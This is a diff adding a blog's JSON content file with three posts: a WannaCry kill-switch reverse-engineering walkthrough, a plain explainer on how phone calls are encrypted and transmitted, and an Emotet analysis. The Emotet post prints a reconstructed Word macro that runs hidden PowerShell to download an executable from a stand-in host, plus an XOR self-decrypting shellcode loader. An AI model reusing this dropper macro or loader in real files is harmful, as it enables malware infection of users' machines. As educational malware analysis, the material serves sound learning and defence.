@@ -1,0 +1,221 @@
+[
+    {
+        "id": "s01",
+        "category": "sec",
+        "title": "WannaCry: The NSA 0-day abuser",
+        "date": "2026-01-07",
+        "tag": "RANSOMWARE",
+        "summary": "Cyberweapon from 2017",
+        "intro": "WannaCry was a global disaster, but the reverse engineering part? Yeah, it was that easy. The authors basically left a giant OFF switch right in the middle of the hallway.",
+        "steps": [
+            {
+                "title": "01. The Detective Work",
+                "body": [
+                    {
+                        "type": "text",
+                        "value": "I started by running strings on the binary. I didn't even need a decompiler yet. I just scrolled through the output and found a URL that looked like someone fell asleep on their keyboard."
+                    },
+                    {
+                        "type": "code",
+                        "value": "http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com"
+                    }
+                ]
+            },
+            {
+                "title": "02. Static Analysis in IDA",
+                "body": [
+                    {
+                        "type": "text",
+                        "value": "I jumped into IDA Pro and looked for where that string was actually used. It turns out, before the malware does anything fun like locking your files, it calls InternetOpenUrlA."
+                    },
+                    {
+                        "type": "code",
+                        "value": [
+                            "HINTERNET hSession = InternetOpenA(\"Mozilla/4.0\", 1, NULL, NULL, 0);",
+                            "HINTERNET hUrl = InternetOpenUrlA(hSession, \"http://www.iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com\", NULL, 0, 0x84000000, 0);",
+                            "",
+                            "if (hUrl) {",
+                            "    InternetCloseHandle(hUrl);",
+                            "    InternetCloseHandle(hSession);",
+                            "    ExitProcess(0);",
+                            "}"
+                        ]
+                    },
+                    {
+                        "type": "text",
+                        "value": "Yeah, it was that easy. If the connection returns a valid handle, the program just quits. The logic was meant to detect sandboxes that fake an internet connection, but it backfired when a researcher actually registered the domain."
+                    }
+                ]
+            },
+            {
+                "title": "03. Assembly Check",
+                "body": [
+                    {
+                        "type": "text",
+                        "value": "In the debugger, I looked at the actual branching logic. It’s a simple test eax, eax followed by a jump. If the API returns anything other than zero (meaning the domain is live), it skips the entire ransomware routine."
+                    },
+                    {
+                        "type": "image",
+                        "value": "assets/images/s01-p01.png"
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        "id": "m01",
+        "category": "magic",
+        "thumbnail": "assets/images/m01-thumb.png",
+        "title": "How Phone Calls Work",
+        "date": "2026-01-28",
+        "tag": "TELECOM",
+        "summary": "Deep dive into the architectural layers of modern cellular communication.",
+        "intro": "Turning your voice into a digital secret that can fly through the air is a massive feat of engineering.",
+        "sections": [
+            {
+                "heading": "Microphone and Digital Sampling",
+                "content": [
+                    {
+                        "type": "text",
+                        "value": "It all starts with Pulse Code Modulation. Your phone’s hardware takes snapshots of the continuous air pressure wave thousands of times per second. It measures the height of the wave at each tiny interval and assigns that height a specific number. If the snapshots are frequent enough, the phone can reconstruct the curve of your voice later on, much like how a series of still photos becomes a smooth movie."
+                    },
+                    {
+                        "type": "image",
+                        "value": "assets/images/m01-p01.png"
+                    }
+                ]
+            },
+            {
+                "heading": "Voice Coder and Data Optimization",
+                "content": [
+                    {
+                        "type": "text",
+                        "value": "To keep bandwidth low, we use a Vocoder. Instead of sending raw audio, it identifies the pitch, volume, and vocal tract shape. It creates a mathematical recipe. When this recipe reaches the other side, the phone synthesizes your voice. This is why calls sound robotic on bad connections—the phone is trying to fill in the blanks of a broken recipe."
+                    },
+                    {
+                        "type": "image",
+                        "value": "assets/images/m01-p02.png"
+                    }
+                ]
+            },
+            {
+                "heading": "Cryptographic Handshake",
+                "content": [
+                    {
+                        "type": "text",
+                        "value": "Before transmission, the phone and the core network perform a handshake using SIM credentials. Both sides independently generate a keystream. This random string of numbers ensures that the conversation is synchronized with a secret code that is never actually sent over the air."
+                    }
+                ]
+            },
+            {
+                "heading": "Exclusive Or (XOR) Encryption",
+                "content": [
+                    {
+                        "type": "text",
+                        "value": "The phone performs an XOR operation between your raw voice data and the secret keystream. In binary logic, the rule is simple: if the bits are the same, the result is 0; if they are different, it's 1."
+                    },
+                    {
+                        "type": "code",
+                        "value": "A \u2295 B = C"
+                    },
+                    {
+                        "type": "text",
+                        "value": "This flips the 1s and 0s of your voice into gibberish. Only the receiver, generating the exact same keystream, can perform the XOR again to reveal the original voice data."
+                    },
+                    {
+                        "type": "image",
+                        "value": "assets/images/m01-p03.png"
+                    }
+                ]
+            },
+            {
+                "heading": "Riding the Carrier Wave",
+                "content": [
+                    {
+                        "type": "text",
+                        "value": "To travel through space, the data needs a vehicle. The phone uses Modulation to modify a high-frequency radio wave in real-time. Shifting the frequency or phase of the wave represents the digital 1s and 0s, effectively turning radio waves into a physical language."
+                    }
+                ]
+            },
+            {
+                "heading": "Global Routing and Fiber Highways",
+                "content": [
+                    {
+                        "type": "text",
+                        "value": "At the cell tower, antennas scan for these changes. The tower demodulates the signal, pulling the digital bits out of the air. This data is then funneled into high-speed fiber-optic cables, carrying your encrypted voice across the globe at the speed of light."
+                    },
+                    {
+                        "type": "image",
+                        "value": "assets/images/m01-p04.png"
+                    }
+                ]
+            }
+        ]
+    },
+    {
+        "id": "s02",
+        "category": "sec",
+        "title": "Emotet: Hide and Seek Masterclass",
+        "date": "2026-01-11",
+        "tag": "Trojan",
+        "summary": "Banking trojan designed to steal money from people :(",
+        "intro": "Emotet is much more of a headache. It doesn't just run; it unfolds like a bad dream. It starts with a Word doc, and honestly, the \"hack\" here is just hoping the user is bored enough to click \"Enable Content.\"",
+        "steps": [
+            {
+                "title": "01. Dealing with the VBA Mess",
+                "body": [
+                    {
+                        "type": "text",
+                        "value": "The first layer is a macro. The code is a nightmare of string slicing to bypass simple antivirus signatures. I had to manually put the pieces together to see what it was trying to launch."
+                    },
+                    {
+                        "type": "code",
+                        "value": [
+                            "Sub AutoOpen()",
+                            "    Dim a As String",
+                            "    Dim b As String",
+                            "    a = \"powe\"",
+                            "    b = \"rshell -ExecutionPolicy Bypass -W Hidden -command \"",
+                            "    Shell a + b + \"(New-Object Net.WebClient).DownloadFile('http://sketchy-site.com/cc.exe', 'C:\\windows\\temp\\payload.exe')\"",
+                            "End Sub"
+                        ]
+                    }
+                ]
+            },
+            {
+                "title": "02. Decrypting the PowerShell Stager",
+                "body": [
+                    {
+                        "type": "text",
+                        "value": "The command is usually a Base64-encoded blob. Once I decoded it, I found a script that cycles through a list of compromised websites to download the actual malware payload."
+                    },
+                    {
+                        "type": "image",
+                        "value": "assets/images/s02-p01.png"
+                    }
+                ]
+            },
+            {
+                "title": "03. Unpacking the Final Binary",
+                "body": [
+                    {
+                        "type": "text",
+                        "value": "The 991.exe is a packed binary. If you open it in a decompiler, it looks like nonsense because the real code is encrypted in the data section. I had to use a debugger (x64dbg) and set a breakpoint on VirtualAlloc. <br><br>I just waited for the malware to allocate memory, decrypt itself, and then I dumped that memory to a file. Yeah, it was that easy—you just let the malware do the hard work of decrypting itself for you."
+                    },
+                    {
+                        "type": "code",
+                        "value": [
+                            "LPVOID mem = VirtualAlloc(NULL, payloadSize, MEM_COMMIT, PAGE_READWRITE);",
+                            "MoveMemory(mem, encryptedBlob, payloadSize);",
+                            "for(int i = 0; i < payloadSize; i++) {",
+                            "    ((BYTE*)mem)[i] ^= 0xAA;",
+                            "}",
+                            "VirtualProtect(mem, payloadSize, PAGE_EXECUTE_READ, &old);",
+                            "((void(*)())mem)();"
+                        ]
+                    }
+                ]
+            }
+        ]
+    }
+]
